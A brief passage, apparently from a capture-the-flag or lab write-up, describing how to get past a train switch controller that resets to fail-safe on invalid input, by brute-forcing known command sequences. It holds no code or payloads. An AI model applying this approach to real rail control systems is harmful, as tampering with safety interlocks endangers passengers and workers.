Now let's check which sequence really works

Beware, that if sequence is broken by, for instance, a completely wrong command or some random string then internal 
safety state of train system resets to fail safe and switch wont be switched until correct sequence is sent!!!

So random bruteforce wont work.

Solution is to implement smart bruteforce by knowing correct sequences and try each sequence out.
